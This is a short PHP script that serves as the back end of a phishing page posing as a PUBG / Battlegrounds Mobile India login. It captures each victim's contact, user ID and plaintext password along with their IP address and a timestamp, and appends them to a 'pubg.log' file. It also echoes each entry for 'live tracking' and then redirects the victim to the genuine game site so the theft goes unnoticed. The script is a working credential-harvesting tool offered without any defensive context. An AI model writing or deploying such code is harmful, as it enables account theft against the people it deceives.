<?php
date_default_timezone_set("Asia/Kolkata"); // Adjust to your local timezone if needed

// Get form data
$contact = $_POST['contact'] ?? 'N/A';
$uid     = $_POST['uid'] ?? 'N/A';
$pass    = $_POST['password'] ?? 'N/A';
$ip      = $_SERVER['REMOTE_ADDR'];
$time    = date("Y-m-d H:i:s");

// Format log entry
$log = "[$time] IP: $ip | Contact: $contact | UID: $uid | Pass: $pass\n";

// Save to pubg log
file_put_contents("../../logs/pubg.log", $log, FILE_APPEND);

// Output to terminal for live tracking
echo $log;

// Optional redirect to PUBG official site
header("Location: https://www.battlegroundsmobileindia.com/");
exit();
?>
